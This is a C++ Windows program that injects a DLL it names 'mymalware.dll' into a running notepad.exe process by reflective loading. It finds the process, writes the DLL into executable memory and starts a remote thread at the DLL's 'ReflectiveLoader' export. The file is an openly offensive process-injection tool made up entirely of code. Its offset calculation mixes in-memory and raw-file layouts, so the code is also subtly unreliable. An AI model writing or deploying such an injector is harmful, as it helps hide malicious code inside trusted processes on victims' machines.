#include <windows.h>
#include <iostream>
#include <fstream>
#include <tlhelp32.h>

// Helper: read a file into a buffer
bool ReadFileToBuffer(const char* filePath, char** outBuffer, size_t* outSize)
{
    std::ifstream file(filePath, std::ios::binary | std::ios::ate);
    if (!file)
        return false;

    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);

    *outBuffer = new char[size];
    if (!file.read(*outBuffer, size))
    {
        delete[] *outBuffer;
        return false;
    }
    *outSize = size;
    return true;
}

int main()
{
    // 1) Path to your compiled DLL
    const char* dllPath = "mymalware.dll";

    // 2) Name of process to inject into
    const char* targetProcessName = "notepad.exe";

    // 3) Load DLL into local buffer
    char* dllBuffer = nullptr;
    size_t dllSize = 0;
    if (!ReadFileToBuffer(dllPath, &dllBuffer, &dllSize))
    {
        std::cerr << "Failed to read DLL file." << std::endl;
        return 1;
    }

    // 4) Find target process ID
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
    {
        std::cerr << "Failed to create process snapshot." << std::endl;
        return 1;
    }

    PROCESSENTRY32 pe = { sizeof(pe) };
    if (Process32First(snapshot, &pe))
    {
        do {
            if (_stricmp(pe.szExeFile, targetProcessName) == 0)
            {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);

    if (pid == 0)
    {
        std::cerr << "Target process not found." << std::endl;
        return 1;
    }

    std::cout << "Injecting into PID: " << pid << std::endl;

    // 5) Open process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess)
    {
        std::cerr << "Failed to open process." << std::endl;
        return 1;
    }

    // 6) Allocate memory in the target process
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer)
    {
        std::cerr << "Failed to allocate memory in target process." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // 7) Write DLL into the remote process memory
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remoteBuffer, dllBuffer, dllSize, &written))
    {
        std::cerr << "Failed to write DLL to target process." << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // 8) Calculate ReflectiveLoader offset
    HMODULE hLocalDll = LoadLibraryA(dllPath);
    if (!hLocalDll)
    {
        std::cerr << "Failed to load DLL locally." << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    FARPROC reflectiveLoaderLocal = GetProcAddress(hLocalDll, "ReflectiveLoader");
    if (!reflectiveLoaderLocal)
    {
        std::cerr << "ReflectiveLoader export not found." << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    DWORD_PTR reflectiveOffset = (DWORD_PTR)reflectiveLoaderLocal - (DWORD_PTR)hLocalDll;

    std::cout << "ReflectiveLoader offset: 0x" << std::hex << reflectiveOffset << std::endl;

    // 9) Calculate remote ReflectiveLoader address
    LPTHREAD_START_ROUTINE remoteLoader = (LPTHREAD_START_ROUTINE)((BYTE*)remoteBuffer + reflectiveOffset);

    // 10) Create remote thread at ReflectiveLoader
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, remoteLoader, NULL, 0, NULL);
    if (!hThread)
    {
        std::cerr << "Failed to create remote thread." << std::endl;
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Injection started successfully." << std::endl;

    // 11) Cleanup
    CloseHandle(hThread);
    CloseHandle(hProcess);
    delete[] dllBuffer;
    return 0;
}
